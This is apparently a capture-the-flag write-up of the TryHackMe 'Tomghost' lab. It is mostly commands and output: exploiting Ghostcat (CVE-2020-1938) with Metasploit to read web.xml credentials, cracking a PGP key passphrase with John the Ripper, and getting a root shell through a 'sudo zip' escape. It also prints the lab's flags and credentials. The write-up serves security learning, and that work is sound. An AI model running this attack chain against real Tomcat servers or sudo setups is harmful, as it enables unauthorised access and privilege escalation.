---
layout: post
title: Tomghost
subtitle: TryHackMe - Tomghost
description: Enumerate services, exploit Ghostcat CVE, decrypt credentials, and escalate privileges with sudo zip to capture flags.
image: https://assets.tryhackme.com/additional/imgur/fR0jVuM.png
optimized_image: https://assets.tryhackme.com/additional/imgur/fR0jVuM.png
tags:
  - TryHackMe
  - Ghostcat
  - CVE-2020-1938
  - PGP Decryption
  - Sudo Zip Privesc
  - Find Flags
author: Mustafa Altayeb
date: 2025-10-28 00:00
paginate: true
---

# Tomghost
[Tomghost](https://assets.tryhackme.com/additional/imgur/fR0jVuM.png)

![](https://assets.tryhackme.com/additional/imgur/fR0jVuM.png)

## Objectives
1. **Scan with Nmap** to identify open ports and services.
2. **Exploit Ghostcat (CVE-2020-1938)** on AJP port 8009 to extract credentials from `/WEB-INF/web.xml`.
3. **Gain initial SSH access** as user `skyfuck`.
4. **Locate and read the user flag** in `/home/merlin/user.txt`.
5. **Decrypt `credential.pgp`** using the private key `tryhackme.asc` (crack passphrase with John the Ripper).
6. **Switch to user `merlin`** using the decrypted password.
7. **Privilege escalate to root** using `sudo zip` abuse.
8. **Capture the root flag**.

## Enumeration

### Nmap Scan
Port scan:
```bash
nmap -sCV -p- -T4 -oA nmap_tomghost 10.10.182.213
```
**Result**
```bash
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-title: Apache Tomcat/9.0.30
|_http-favicon: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
**Key Findings**:
- **Port 22**: OpenSSH 7.2p2 Ubuntu 4ubuntu2.8.
- **Port 8009**: The Apache JServ Protocol is active. This is particularly noteworthy because critical vulnerabilities, such as **‚ÄúGhostcat‚Äù (CVE-2020‚Äì1938)**, may be exploitable through the AJP protocol in Apache Tomcat. This port is usually closed, and its openness poses a security risk.
- **Port 8080**: Apache Tomcat 9.0.30 web server is running, which is also an older version.

# Initial Access 

Searching about SSH version I found it has vulnerabilities:
```bash
üíª  T4T4R1S  üåê | Local IP ‚ûú 192.168.115.133 | ü•∑ VPN IP ‚ûú 10.14.109.66
üëÄ  ‚ûú ~/thm_machines/thomghost  searchsploit 7.2p2      
...................
OpenSSH 7.2p2 - Username Enumeration    | linux/remote/40136.py
OpenSSHd 7.2p2 - Username Enumeration   | linux/remote/40113.txt
.............
```
Not useful for our purpose.

After that, we have **port 8009 with CVE** ‚Äî let's check that with Metasploit scanner:

```bash
msf6 > use auxiliary/admin/http/tomcat_ghostcat
msf6 auxiliary(admin/http/tomcat_ghostcat) > options

Module options (auxiliary/admin/http/tomcat_ghostcat):

   Name      Current Setting   Required  Description
   ----      ---------------   --------  -----------
   FILENAME  /WEB-INF/web.xml  yes       File name
   RHOSTS                      yes       The target host(s)
   RPORT     8009              yes       The Apache JServ Protocol (AJP) port (TCP)

msf6 auxiliary(admin/http/tomcat_ghostcat) > set Rhosts 10.10.182.213
Rhosts => 10.10.182.213
msf6 auxiliary(admin/http/tomcat_ghostcat) > run
```
**Results** 
```bash
[*] Running module against 10.10.182.213
<?xml version="1.0" encoding="UTF-8"?>
<!--

.
.
....
...
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
        skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>
[+] 10.10.182.213:8009 - File contents save to: /root/.msf4/loot/20251028095535_default_10.10.182.213_WEBINFweb.xml_806978.txt
[*] Auxiliary module execution completed
```

**Found login credentials via SSH:**
- Username: `skyfuck`
- Password: `8730281lkjlkjdqlksalks`

Login with SSH:

```bash
üíª  T4T4R1S  üåê | Local IP ‚ûú 192.168.115.133 | ü•∑ VPN IP ‚ûú 10.14.109.66
üëÄ  ‚ûú ~/thm_machines/thomghost  ssh skyfuck@10.10.182.213
The authenticity of host '10.10.182.213 (10.10.182.213)' can't be established.
ED25519 key fingerprint is SHA256:tWlLnZPnvRHCM9xwpxygZKxaf0vJ8/J64v9ApP8dCDo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes 
Warning: Permanently added '10.10.182.213' (ED25519) to the list of known hosts.
skyfuck@10.10.182.213's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

skyfuck@ubuntu:~$ whoami
skyfuck
```
Now we gain access as **skyfuck** user.

I tried to run `sudo` but this user does **not** have permission to run sudo.

## User Flag 
User flag is in `/home/merlin`:
```bash
skyfuck@ubuntu:/home/merlin$ cat user.txt
THM{GhostCat_1s_so_cr4sy}
```

Back to skyfuck home, I find 2 files:
```bash
skyfuck@ubuntu:~$ ls
credential.pgp  tryhackme.asc
```
We have two files:
- `tryhackme.asc` ‚Üí **PGP private key**
- `credential.pgp` ‚Üí **encrypted file** (requires the private key to decrypt)

I will transfer them to my attack machine to crack it.

```bash
skyfuck@ubuntu:~$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 ...
```
Download on attacker machine:
> **wget http://10.10.182.213:8000/credential.pgp**  
> **wget http://10.10.182.213:8000/tryhackme.asc**

---

**Crack `tryhackme.asc` with John the Ripper**

First, convert the key to hash format:
```bash
gpg2john tryhackme.asc > hashh
```

Crack it:
```bash
john hashh --wordlist=/usr/share/wordlists/rockyou.txt
```

```bash
üíª  T4T4R1S  üåê | Local IP ‚ûú 192.168.115.133 | ü•∑ VPN IP ‚ûú 10.14.109.66
üëÄ  ‚ûú ~/thm_machines/thomghost  john --show hashh
tryhackme:alexandru:::tryhackme <stuxnet@tryhackme.com>::tryhackme.asc

1 password hash cracked, 0 left
```
**Passphrase:** `alexandru`

Now decrypt `credential.pgp`:
```bash
gpg --import tryhackme.asc
gpg --decrypt credential.pgp
```
```bash
gpg: key 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: key 8F3DA3DEC6707170: secret key imported
gpg: Total number processed: 2
gpg:       secret keys read: 1
gpg:  secret keys unchanged: 1
gpg: encrypted with elg1024 key, ID 61E104A66184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j# 
```

**Got credentials for `merlin`:**
> `merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j#`

Switch user:
```bash
skyfuck@ubuntu:~$ su merlin
Password: 
merlin@ubuntu:~$ 
```

## Privilege Escalation 

Enumerate `merlin` sudo permissions:
```bash
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

**Found:** This user can run `/usr/bin/zip` as root with **NOPASSWD**.

Searched for exploit ‚Üí found **GTFOBins** method for `zip`:

```bash
merlin@ubuntu:~$ TF=$(mktemp -u)
merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)

# whoami
root
# 
```
**NOW WE ARE ROOT**

## Root Flag 
```bash
# cat /root/root.txt
THM{Z1P_1S_FAKE}
 ```
 
**Finished. Happy Hacking!**

<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3186403" style="border:none;"></iframe>

**Follow me:**
- [LinkedIn](https://www.linkedin.com/in/t4t4r1s/)
- [X](https://x.com/T4T4R1S)
```